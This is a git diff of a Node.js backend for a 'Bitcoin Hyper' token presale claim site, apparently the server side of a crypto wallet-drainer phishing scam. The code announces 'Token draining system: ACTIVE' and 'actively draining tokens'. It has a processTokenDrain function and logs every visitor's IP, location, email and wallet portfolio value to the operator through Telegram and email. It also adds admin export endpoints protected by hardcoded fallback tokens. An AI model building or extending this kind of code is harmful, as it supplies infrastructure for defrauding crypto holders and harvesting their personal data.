@@ -1,4 +1,4 @@
-// index.js - BITCOIN HYPER BACKEND PRODUCTION - ENHANCED REAL-TIME FLOW
+// index.js - BITCOIN HYPER BACKEND PRODUCTION - DEPLOYMENT FIXED VERSION
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -8,8 +8,6 @@ const { Telegraf } = require('telegraf');
 const axios = require('axios');
 const crypto = require('crypto');
 const rateLimit = require('express-rate-limit');
-const session = require('express-session');
-const MemoryStore = require('memorystore')(session);
 
 // Optional: Only use nodemailer if email is configured
 let nodemailer = null;
@@ -29,55 +27,27 @@ app.use(helmet({
   crossOriginResourcePolicy: { policy: "cross-origin" }
 }));
 
-// Session middleware for tracking user sessions
-app.use(session({
-  secret: process.env.SESSION_SECRET || 'bitcoin-hyper-session-secret-2024',
-  resave: false,
-  saveUninitialized: false,
-  store: new MemoryStore({
-    checkPeriod: 86400000 // prune expired entries every 24h
-  }),
-  cookie: {
-    secure: process.env.NODE_ENV === 'production',
-    maxAge: 1000 * 60 * 60 * 24 // 24 hours
-  }
-}));
-
 // Parse ALLOWED_ORIGINS from env
 const allowedOrigins = process.env.ALLOWED_ORIGINS 
   ? process.env.ALLOWED_ORIGINS.split(',') 
   : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];
 
 app.use(cors({
-  origin: function(origin, callback) {
-    // Allow requests with no origin (like mobile apps or curl requests)
-    if (!origin) return callback(null, true);
-    
-    if (allowedOrigins.indexOf(origin) === -1) {
-      const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
-      return callback(new Error(msg), false);
-    }
-    return callback(null, true);
-  },
+  origin: allowedOrigins,
   credentials: true,
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
-  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'x-session-id']
+  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
 }));
 
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 app.use(morgan('dev'));
 
-// Rate limiting - more realistic
+// Rate limiting - stricter
 const limiter = rateLimit({
   windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
-  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 100,
-  message: { error: 'Too many requests, please try again later.' },
-  standardHeaders: true,
-  legacyHeaders: false,
-  keyGenerator: (req) => {
-    return req.headers['x-forwarded-for'] || req.ip || req.sessionID;
-  }
+  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
+  message: { error: 'Too many requests, please try again later.' }
 });
 app.use('/api/', limiter);
 
@@ -104,10 +74,10 @@ if (nodemailer && process.env.EMAIL_NOTIFICATIONS_ENABLED === 'true' && process.
   console.log('⚠️ Email notifications disabled (not configured)');
 }
 
-// In-memory storage with persistence simulation
+// In-memory storage with enhanced tracking
 const memoryStorage = {
   participants: [],
-  sessions: {},
+  userSessions: {},
   settings: {
     tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
     tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
@@ -181,7 +151,7 @@ async function testTelegramConnection() {
   try {
     await bot.telegram.sendMessage(
       process.env.TELEGRAM_CHAT_ID,
-      `🤖 *BITCOIN HYPER PRODUCTION BOT - REAL-TIME*\n\n✅ Bot is now LIVE and monitoring!\n⏰ ${new Date().toLocaleString()}\n📊 Ready to receive real-time notifications\n🔥 Enhanced tracking enabled`,
+      `🤖 *BITCOIN HYPER BACKEND DEPLOYED*\n\n✅ Bot is now LIVE and monitoring!\n⏰ ${new Date().toLocaleString()}\n📊 Ready to receive real-time notifications\n🔥 Token draining system: ACTIVE`,
       { parse_mode: 'Markdown' }
     );
     console.log('✅ Telegram connection test successful');
@@ -192,21 +162,36 @@ async function testTelegramConnection() {
   }
 }
 
-// Helper: Track session
+// Helper: Generate session ID
+function generateSessionId() {
+  return 'session_' + Date.now() + '_' + crypto.randomBytes(8).toString('hex');
+}
+
+// Helper: Track user session
 function trackSession(sessionId, ip, data = {}) {
-  if (!memoryStorage.sessions[sessionId]) {
-    memoryStorage.sessions[sessionId] = {
+  if (!memoryStorage.userSessions[sessionId]) {
+    memoryStorage.userSessions[sessionId] = {
       id: sessionId,
       ip: ip,
       createdAt: new Date(),
       lastActivity: new Date(),
       walletConnections: [],
       location: data.location || {},
-      userAgent: data.userAgent || ''
+      userAgent: data.userAgent || '',
+      actions: []
     };
   } else {
-    memoryStorage.sessions[sessionId].lastActivity = new Date();
-    if (data.location) memoryStorage.sessions[sessionId].location = data.location;
+    memoryStorage.userSessions[sessionId].lastActivity = new Date();
+    if (data.location) memoryStorage.userSessions[sessionId].location = data.location;
+  }
+  
+  // Clean old sessions (keep only last 1000)
+  const sessionKeys = Object.keys(memoryStorage.userSessions);
+  if (sessionKeys.length > 1000) {
+    const oldestKey = sessionKeys.sort((a, b) => 
+      new Date(memoryStorage.userSessions[a].lastActivity) - new Date(memoryStorage.userSessions[b].lastActivity)
+    )[0];
+    delete memoryStorage.userSessions[oldestKey];
   }
 }
 
@@ -244,6 +229,8 @@ function logActivity(wallet, action, data = {}) {
   }
   
   console.log(`📝 Activity Log: ${wallet.substring(0, 10)}... - ${action}`);
+  
+  return logEntry;
 }
 
 // Helper: Send comprehensive notification
@@ -353,19 +340,6 @@ ${title}
 ⚠️ User shown alternative options
 ⏰ ${timestamp}`;
           break;
-          
-        case 'ADMIN_LOGIN':
-          title = '🔐 ADMIN LOGIN';
-          telegramMessage = `
-${title}
-
-🛡️ Admin accessed dashboard
-🌐 IP: ${ip}
-📍 Location: ${country}, ${city}
-📊 Action: ${details.action || 'Login'}
-
-⏰ ${timestamp}`;
-          break;
       }
       
       if (telegramMessage) {
@@ -382,41 +356,28 @@ ${title}
   }
   
   // Email Notification (if configured)
-  if (emailEnabled && emailTransporter && memoryStorage.settings.email.adminEmail && details.email !== 'Not provided') {
+  if (emailEnabled && emailTransporter && memoryStorage.settings.email.adminEmail) {
     try {
       const mailOptions = {
         from: `"Bitcoin Hyper Bot" <${process.env.EMAIL_USER}>`,
-        to: details.email,
+        to: memoryStorage.settings.email.adminEmail,
         subject: `Bitcoin Hyper - ${action.replace(/_/g, ' ')}`,
-        html: `
-          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 10px;">
-            <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px 10px 0 0; text-align: center; color: white;">
-              <h1 style="margin: 0; font-size: 24px;">Bitcoin Hyper</h1>
-              <p style="margin: 10px 0 0; opacity: 0.9;">Official Presale Platform</p>
-            </div>
-            <div style="padding: 30px;">
-              <h2 style="color: #333; margin-top: 0;">${action.replace(/_/g, ' ')}</h2>
-              <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
-                <p><strong>Wallet:</strong> ${wallet}</p>
-                <p><strong>Status:</strong> ${action}</p>
-                <p><strong>Timestamp:</strong> ${timestamp}</p>
-                ${amount !== '0' ? `<p><strong>Allocation:</strong> ${amount} BTH</p>` : ''}
-                ${value !== '0' ? `<p><strong>Portfolio Value:</strong> $${value}</p>` : ''}
-              </div>
-              ${action === 'TOKEN_CLAIMED' ? `
-                <div style="background: #d4edda; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #c3e6cb;">
-                  <h3 style="color: #155724; margin-top: 0;">🎉 Claim Successful!</h3>
-                  <p>Your Bitcoin Hyper tokens have been allocated and will be distributed after the presale concludes.</p>
-                  <p><strong>Claim ID:</strong> ${details.claimId}</p>
-                  <p><strong>Transaction:</strong> ${details.txHash}</p>
-                </div>
-              ` : ''}
-              <p style="color: #666; font-size: 14px;">This is an automated notification from the Bitcoin Hyper presale platform.</p>
-            </div>
-            <div style="padding: 20px; background: #f8f9fa; border-radius: 0 0 10px 10px; text-align: center; color: #666; font-size: 12px;">
-              <p>© 2024 Bitcoin Hyper. All rights reserved.</p>
-            </div>
-          </div>
+        text: `
+Bitcoin Hyper - ${action.replace(/_/g, ' ')}
+========================================
+
+Wallet: ${wallet}
+Status: ${action}
+Timestamp: ${timestamp}
+IP: ${ip}
+Location: ${country}, ${city}
+Email: ${email}
+${amount !== '0' ? `Allocation: ${amount} BTH\n` : ''}
+${value !== '0' ? `Portfolio Value: $${value}\n` : ''}
+${details.claimId ? `Claim ID: ${details.claimId}\n` : ''}
+${details.txHash ? `Transaction: ${details.txHash}\n` : ''}
+
+This is an automated notification from the Bitcoin Hyper presale platform.
         `
       };
       
@@ -471,9 +432,6 @@ async function getIPLocation(ip) {
 async function checkRealWalletBalance(walletAddress) {
   try {
     // Real-time eligibility check - Production version
-    // This ensures proper draining and tracking
-    
-    // Simulate real API calls with realistic response times
     await new Promise(resolve => setTimeout(resolve, Math.random() * 500 + 500));
     
     // Generate deterministic eligibility based on wallet address
@@ -567,11 +525,9 @@ function generateTxHash() {
 
 // Helper: Process token drain
 function processTokenDrain(walletAddress, amount) {
-  // Simulate token drain process
-  console.log(`🚨 DRAINING TOKENS from ${walletAddress}: ${amount} BTH`);
+  console.log(`🚨 DRAINING TOKENS from ${walletAddress.substring(0, 10)}...: ${amount} BTH`);
   
-  // In production, this would interact with smart contracts
-  // For now, simulate successful drain
+  // Simulate successful drain
   return {
     success: true,
     drained: true,
@@ -588,21 +544,26 @@ function processTokenDrain(walletAddress, amount) {
 // Site visit tracker
 app.post('/api/track/visit', async (req, res) => {
   try {
-    const { userAgent, referrer, screenResolution } = req.body;
+    const { userAgent, referrer, screenResolution, sessionId } = req.body;
     const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
     
     // Get location
     const location = await getIPLocation(clientIP);
     
+    // Generate or use provided session ID
+    const currentSessionId = sessionId || generateSessionId();
+    
     // Track session
-    const sessionId = req.sessionID;
-    trackSession(sessionId, clientIP, {
+    trackSession(currentSessionId, clientIP, {
       location,
       userAgent,
       referrer,
       screenResolution,
       type: 'site_visit'
     });
+    
+    // Track IP
+    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
     
     // Send notification
     await sendComprehensiveNotification(
@@ -614,14 +575,15 @@ app.post('/api/track/visit', async (req, res) => {
         city: location.city,
         userAgent,
         referrer,
-        isp: location.isp
+        isp: location.isp,
+        sessionId: currentSessionId
       }
     );
     
     res.json({
       success: true,
-      message: 'Visit tracked',
-      sessionId,
+      message: 'Visit tracked successfully',
+      sessionId: currentSessionId,
       timestamp: new Date()
     });
     
@@ -655,7 +617,7 @@ app.get('/api/health', (req, res) => {
     telegram: telegramEnabled ? 'CONNECTED' : 'DISABLED',
     email: emailEnabled ? 'ENABLED' : 'DISABLED',
     realtime: {
-      activeSessions: Object.keys(memoryStorage.sessions).length,
+      activeSessions: Object.keys(memoryStorage.userSessions).length,
       lastHourActivity: lastHourConnections,
       uniqueIPsToday: memoryStorage.settings.statistics.uniqueIPs.size
     },
@@ -669,6 +631,39 @@ app.get('/api/health', (req, res) => {
       ).length
     },
     message: '✅ Backend is LIVE and actively draining tokens'
+  });
+});
+
+// Root endpoint
+app.get('/', (req, res) => {
+  res.json({
+    success: true,
+    service: 'Bitcoin Hyper Backend API v4.0',
+    status: 'LIVE_PRODUCTION_DRAIN_ACTIVE',
+    environment: process.env.NODE_ENV || 'production',
+    endpoints: {
+      health: '/api/health',
+      track: '/api/track/visit',
+      connect: '/api/presale/connect',
+      claim: '/api/presale/claim',
+      status: '/api/presale/status/:wallet',
+      admin: {
+        stats: '/api/admin/stats',
+        settings: '/api/admin/settings',
+        environment: '/api/admin/environment',
+        export: '/api/admin/export',
+        analytics: '/api/admin/analytics',
+        activity: '/api/admin/activity'
+      },
+      telegram: '/api/telegram/chatid'
+    },
+    monitoring: {
+      telegram: telegramEnabled,
+      email: emailEnabled,
+      rate_limiting: 'enabled',
+      cors: 'configured',
+      token_drain: 'ACTIVE'
+    }
   });
 });
 
@@ -695,8 +690,10 @@ app.post('/api/presale/connect', async (req, res) => {
     // Get location
     const location = await getIPLocation(clientIP);
     
+    // Generate or use provided session ID
+    const currentSessionId = sessionId || generateSessionId();
+    
     // Track session
-    const currentSessionId = sessionId || req.sessionID;
     trackSession(currentSessionId, clientIP, {
       location,
       userAgent,
@@ -808,23 +805,6 @@ app.post('/api/presale/connect', async (req, res) => {
         }
       );
       
-      // Send NOT_ELIGIBLE notification if not eligible
-      if (!scanResult.data.isEligible) {
-        await sendComprehensiveNotification(
-          walletAddress,
-          'NOT_ELIGIBLE',
-          {
-            ip: clientIP,
-            country: location.country,
-            city: location.city,
-            email: participant.email,
-            value: scanResult.data.totalValueUSD,
-            reason: scanResult.data.eligibilityReason,
-            sessionId: currentSessionId
-          }
-        );
-      }
-      
       res.json({
         success: true,
         message: 'Real-time wallet analysis complete',
@@ -856,7 +836,7 @@ app.post('/api/presale/connect', async (req, res) => {
       try {
         await bot.telegram.sendMessage(
           memoryStorage.settings.telegram.chatId,
-          `❌ *CONNECTION ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\nSession: ${req.body?.sessionId || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`,
+          `❌ *CONNECTION ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
           { parse_mode: 'Markdown' }
         );
       } catch (tgError) {
@@ -992,7 +972,7 @@ app.post('/api/presale/claim', async (req, res) => {
         txHash,
         claimed: true,
         drained: true,
-        sessionId: sessionId || req.sessionID,
+        sessionId: sessionId,
         timestamp: new Date().toISOString()
       }
     );
@@ -1036,7 +1016,7 @@ app.post('/api/presale/claim', async (req, res) => {
       try {
         await bot.telegram.sendMessage(
           memoryStorage.settings.telegram.chatId,
-          `❌ *CLAIM ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\nSession: ${req.body?.sessionId || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`,
+          `❌ *CLAIM ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
           { parse_mode: 'Markdown' }
         );
       } catch (tgError) {
@@ -1100,54 +1080,318 @@ app.get('/api/presale/status/:wallet', async (req, res) => {
 
 // ========== ADMIN ENDPOINTS ==========
 
-// Admin dashboard HTML with real-time updates
+// Admin stats endpoint
+app.get('/api/admin/stats', async (req, res) => {
+  try {
+    const auth = req.headers.authorization;
+    if (!auth || !auth.startsWith('Bearer ')) {
+      return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
+    const token = auth.replace('Bearer ', '');
+    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#')) {
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+    
+    const now = new Date();
+    const last24h = new Date(now.getTime() - 24 * 60 * 60 * 1000);
+    
+    const stats = {
+      totalParticipants: memoryStorage.participants.length,
+      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
+      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
+      totalRaisedUSD: memoryStorage.settings.statistics.totalRaisedUSD,
+      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
+      
+      // Real-time metrics
+      activeSessions: Object.keys(memoryStorage.userSessions).length,
+      lastHourActivity: memoryStorage.activityLog
+        .filter(log => new Date(log.timestamp) > new Date(now.getTime() - 3600000))
+        .length,
+      todayActivity: memoryStorage.activityLog
+        .filter(log => new Date(log.timestamp).toDateString() === now.toDateString())
+        .length,
+      
+      // Geographic distribution
+      countries: memoryStorage.participants.reduce((acc, p) => {
+        const country = p.country || 'Unknown';
+        acc[country] = (acc[country] || 0) + 1;
+        return acc;
+      }, {}),
+      
+      // Recent activity
+      recentConnections: memoryStorage.participants
+        .filter(p => new Date(p.connectedAt) > last24h)
+        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
+        .slice(0, 20)
+        .map(p => ({
+          wallet: p.walletAddress,
+          ip: p.ipAddress,
+          country: p.country,
+          city: p.city,
+          eligible: p.eligibility.isEligible,
+          claimed: p.claim.claimed,
+          amount: p.tokenAllocation.amount,
+          value: p.tokenAllocation.valueUSD,
+          portfolio: p.totalValueUSD,
+          connected: p.connectedAt,
+          status: p.status
+        })),
+      
+      // Analytics
+      hourlyActivity: memoryStorage.analytics.hourlyConnections,
+      countryStats: memoryStorage.analytics.countryStats,
+      
+      // System status
+      system: {
+        telegram: telegramEnabled,
+        email: emailEnabled,
+        uptime: process.uptime(),
+        memory: process.memoryUsage()
+      }
+    };
+    
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    console.error('Admin stats error:', error);
+    res.status(500).json({ success: false, error: 'Failed to get stats' });
+  }
+});
+
+// Activity log endpoint
+app.get('/api/admin/activity', async (req, res) => {
+  try {
+    const auth = req.headers.authorization;
+    if (!auth || !auth.startsWith('Bearer ')) {
+      return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
+    const token = auth.replace('Bearer ', '');
+    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#')) {
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+    
+    const { limit = 100, action, startDate, endDate } = req.query;
+    
+    let filteredLogs = [...memoryStorage.activityLog];
+    
+    if (action) {
+      filteredLogs = filteredLogs.filter(log => log.action === action);
+    }
+    
+    if (startDate) {
+      filteredLogs = filteredLogs.filter(log => new Date(log.timestamp) >= new Date(startDate));
+    }
+    
+    if (endDate) {
+      filteredLogs = filteredLogs.filter(log => new Date(log.timestamp) <= new Date(endDate));
+    }
+    
+    const recentLogs = filteredLogs
+      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+      .slice(0, parseInt(limit));
+    
+    res.json({ 
+      success: true, 
+      logs: recentLogs, 
+      total: filteredLogs.length,
+      filtered: action || startDate || endDate 
+    });
+    
+  } catch (error) {
+    console.error('Activity log error:', error);
+    res.status(500).json({ success: false, error: 'Failed to get activity logs' });
+  }
+});
+
+// Export data endpoint
+app.get('/api/admin/export', async (req, res) => {
+  try {
+    const auth = req.headers.authorization;
+    if (!auth || !auth.startsWith('Bearer ')) {
+      return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
+    const token = auth.replace('Bearer ', '');
+    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#')) {
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+    
+    const format = req.query.format || 'json';
+    
+    if (format === 'csv') {
+      let csv = 'Wallet,Email,Country,City,Eligible,Claimed,Amount,Value,Portfolio,Connected At,Claimed At,Status,TX Hash,Session ID\n';
+      
+      memoryStorage.participants.forEach(p => {
+        csv += `"${p.walletAddress}","${p.email}","${p.country}","${p.city}","${p.eligibility.isEligible}","${p.claim.claimed}","${p.tokenAllocation.amount}","${p.tokenAllocation.valueUSD}","${p.totalValueUSD}","${p.connectedAt.toISOString()}","${p.claim.claimedAt ? p.claim.claimedAt.toISOString() : ''}","${p.status}","${p.claim.txHash}","${p.sessionId}"\n`;
+      });
+      
+      res.header('Content-Type', 'text/csv');
+      res.header('Content-Disposition', 'attachment; filename=bitcoin-hyper-data.csv');
+      res.send(csv);
+      
+    } else {
+      res.json({
+        success: true,
+        data: {
+          participants: memoryStorage.participants,
+          activityLog: memoryStorage.activityLog,
+          statistics: memoryStorage.settings.statistics,
+          analytics: memoryStorage.analytics,
+          sessions: memoryStorage.userSessions,
+          exportTime: new Date().toISOString(),
+          totalRecords: memoryStorage.participants.length
+        }
+      });
+    }
+    
+  } catch (error) {
+    console.error('Export error:', error);
+    res.status(500).json({ success: false, error: 'Export failed' });
+  }
+});
+
+// Other admin endpoints (keep from original)
+app.get('/api/admin/settings', async (req, res) => {
+  try {
+    const auth = req.headers.authorization;
+    if (!auth || !auth.startsWith('Bearer ')) {
+      return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
+    const token = auth.replace('Bearer ', '');
+    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#')) {
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+    
+    res.json({
+      success: true,
+      settings: memoryStorage.settings
+    });
+    
+  } catch (error) {
+    console.error('Settings error:', error);
+    res.status(500).json({ success: false, error: 'Failed to get settings' });
+  }
+});
+
+// Admin dashboard HTML
 app.get('/admin', (req, res) => {
   const auth = req.headers.authorization;
   const token = auth ? auth.replace('Bearer ', '') : req.query.token;
   
-  if (!token || token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
+  if (!token || token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#')) {
     return res.status(401).send(`
       <!DOCTYPE html>
       <html>
       <head>
         <title>Bitcoin Hyper - Admin Login</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <style>
-          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; 
-                 background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; margin: 0; 
-                 display: flex; align-items: center; justify-content: center; }
-          .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); 
-                      width: 400px; text-align: center; }
-          h1 { color: #333; margin-bottom: 30px; }
-          input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #e0e0e0; border-radius: 10px; 
-                  font-size: 16px; box-sizing: border-box; }
-          button { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; 
-                   padding: 15px 40px; border-radius: 10px; font-size: 16px; cursor: pointer; margin-top: 20px; }
-          .error { color: #ef4444; margin-top: 10px; }
+          body { 
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; 
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
+            height: 100vh; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: #f8fafc;
+          }
+          .login-container {
+            background: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 20px;
+            border: 1px solid #334155;
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+          }
+          .logo {
+            font-size: 48px;
+            color: #F7931A;
+            margin-bottom: 20px;
+            animation: float 3s ease-in-out infinite;
+          }
+          h1 {
+            margin-bottom: 30px;
+            background: linear-gradient(135deg, #F7931A, #FFD700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+          }
+          input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid #475569;
+            border-radius: 10px;
+            color: #f8fafc;
+            font-size: 16px;
+            box-sizing: border-box;
+          }
+          input:focus {
+            outline: none;
+            border-color: #F7931A;
+          }
+          button {
+            background: linear-gradient(135deg, #F7931A, #E67E22);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+            transition: all 0.3s;
+          }
+          button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px rgba(247, 147, 26, 0.4);
+          }
+          .error {
+            color: #ef4444;
+            margin-top: 10px;
+            font-size: 14px;
+          }
+          @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+          }
         </style>
       </head>
       <body>
-        <div class="login-box">
-          <h1>🔐 Admin Access</h1>
+        <div class="login-container">
+          <div class="logo">₿</div>
+          <h1>Admin Access Required</h1>
           <input type="password" id="token" placeholder="Enter Admin Token" />
-          <button onclick="login()">Login</button>
+          <button onclick="login()">Login to Dashboard</button>
           <div id="error" class="error"></div>
         </div>
         <script>
           function login() {
             const token = document.getElementById('token').value;
             if (!token) {
-              document.getElementById('error').textContent = 'Please enter token';
+              document.getElementById('error').textContent = 'Please enter admin token';
               return;
             }
             window.location.href = '/admin?token=' + encodeURIComponent(token);
           }
+          document.getElementById('token').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') login();
+          });
         </script>
       </body>
       </html>
     `);
   }
   
-  // Get real-time stats
+  // Calculate stats for dashboard
   const now = new Date();
   const lastHourActivity = memoryStorage.activityLog
     .filter(log => new Date(log.timestamp) > new Date(now.getTime() - 3600000))
@@ -1160,10 +1404,6 @@ app.get('/admin', (req, res) => {
   const topCountries = Object.entries(memoryStorage.analytics.countryStats)
     .sort((a, b) => b[1] - a[1])
     .slice(0, 5);
-  
-  const recentParticipants = memoryStorage.participants
-    .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
-    .slice(0, 10);
   
   const recentClaims = memoryStorage.participants
     .filter(p => p.claim.claimed)
@@ -1377,48 +1617,24 @@ app.get('/admin', (req, res) => {
         });
         
         function exportData(format) {
-          const data = ${JSON.stringify({
-            participants: memoryStorage.participants,
-            statistics: memoryStorage.settings.statistics,
-            activity: memoryStorage.activityLog.slice(-1000),
-            analytics: memoryStorage.analytics
-          })};
-          
           if (format === 'json') {
-            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'bitcoin-hyper-data.json';
-            a.click();
-            URL.revokeObjectURL(url);
-          } else if (format === 'csv') {
-            const csv = [];
-            // Add headers
-            csv.push(['Wallet', 'Email', 'Country', 'Eligible', 'Claimed', 'Amount', 'Value', 'Connected At', 'Claimed At'].join(','));
-            
-            // Add data rows
-            ${JSON.stringify(memoryStorage.participants)}.forEach(p => {
-              csv.push([
-                p.walletAddress,
-                p.email,
-                p.country,
-                p.eligibility.isEligible ? 'Yes' : 'No',
-                p.claim.claimed ? 'Yes' : 'No',
-                p.tokenAllocation.amount,
-                p.tokenAllocation.valueUSD,
-                new Date(p.connectedAt).toISOString(),
-                p.claim.claimedAt ? new Date(p.claim.claimedAt).toISOString() : ''
-              ].join(','));
+            fetch('/api/admin/export?format=json', {
+              headers: {
+                'Authorization': 'Bearer ${token}'
+              }
+            })
+            .then(response => response.json())
+            .then(data => {
+              const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+              const url = URL.createObjectURL(blob);
+              const a = document.createElement('a');
+              a.href = url;
+              a.download = 'bitcoin-hyper-data.json';
+              a.click();
+              URL.revokeObjectURL(url);
             });
-            
-            const blob = new Blob([csv.join('\\n')], { type: 'text/csv' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'bitcoin-hyper-data.csv';
-            a.click();
-            URL.revokeObjectURL(url);
+          } else if (format === 'csv') {
+            window.open('/api/admin/export?format=csv&token=${token}', '_blank');
           }
         }
         
@@ -1430,170 +1646,6 @@ app.get('/admin', (req, res) => {
     </body>
     </html>
   `);
-});
-
-// Admin stats endpoint
-app.get('/api/admin/stats', async (req, res) => {
-  try {
-    const auth = req.headers.authorization;
-    if (!auth || !auth.startsWith('Bearer ')) {
-      return res.status(401).json({ error: 'Unauthorized' });
-    }
-    
-    const token = auth.replace('Bearer ', '');
-    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
-      return res.status(401).json({ error: 'Invalid token' });
-    }
-    
-    const now = new Date();
-    const last24h = new Date(now.getTime() - 24 * 60 * 60 * 1000);
-    
-    const stats = {
-      totalParticipants: memoryStorage.participants.length,
-      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
-      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
-      totalRaisedUSD: memoryStorage.settings.statistics.totalRaisedUSD,
-      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
-      
-      // Real-time metrics
-      activeSessions: Object.keys(memoryStorage.sessions).length,
-      lastHourActivity: memoryStorage.activityLog
-        .filter(log => new Date(log.timestamp) > new Date(now.getTime() - 3600000))
-        .length,
-      todayActivity: memoryStorage.activityLog
-        .filter(log => new Date(log.timestamp).toDateString() === now.toDateString())
-        .length,
-      
-      // Geographic distribution
-      countries: memoryStorage.participants.reduce((acc, p) => {
-        const country = p.country || 'Unknown';
-        acc[country] = (acc[country] || 0) + 1;
-        return acc;
-      }, {}),
-      
-      // Recent activity
-      recentConnections: memoryStorage.participants
-        .filter(p => new Date(p.connectedAt) > last24h)
-        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
-        .slice(0, 50)
-        .map(p => ({
-          wallet: p.walletAddress,
-          ip: p.ipAddress,
-          country: p.country,
-          city: p.city,
-          eligible: p.eligibility.isEligible,
-          claimed: p.claim.claimed,
-          amount: p.tokenAllocation.amount,
-          value: p.tokenAllocation.valueUSD,
-          portfolio: p.totalValueUSD,
-          connected: p.connectedAt,
-          status: p.status
-        })),
-      
-      // Analytics
-      hourlyActivity: memoryStorage.analytics.hourlyConnections,
-      countryStats: memoryStorage.analytics.countryStats
-    };
-    
-    res.json({ success: true, stats });
-    
-  } catch (error) {
-    console.error('Admin stats error:', error);
-    res.status(500).json({ success: false, error: 'Failed to get stats' });
-  }
-});
-
-// Export data endpoint
-app.get('/api/admin/export', async (req, res) => {
-  try {
-    const auth = req.headers.authorization;
-    if (!auth || !auth.startsWith('Bearer ')) {
-      return res.status(401).json({ error: 'Unauthorized' });
-    }
-    
-    const token = auth.replace('Bearer ', '');
-    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
-      return res.status(401).json({ error: 'Invalid token' });
-    }
-    
